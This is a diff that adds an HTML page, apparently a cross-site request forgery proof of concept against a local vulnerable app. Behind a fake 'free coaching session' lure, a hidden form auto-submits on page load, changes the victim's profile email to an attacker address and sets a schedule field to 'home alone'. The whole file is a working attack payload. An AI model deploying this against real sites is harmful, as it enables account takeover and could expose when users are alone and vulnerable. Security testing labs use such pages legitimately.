@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<head><title>Free Coaching Session - Click to Claim!</title></head>
+<body>
+<h1>Congratulations! Loading your free session details...</h1>
+
+<form id="csrfForm" action="http://localhost:8080/vuln/profile/update" method="POST">
+    <input type="hidden" name="id" value="1"/>
+    <input type="hidden" name="email" value="attacker@evil.example"/>
+    <input type="hidden" name="availableSlot" value="Tuesday 10:00-11:00, home alone"/>
+</form>
+
+<script>
+    document.getElementById("csrfForm").submit();
+</script>
+</body>
+</html>
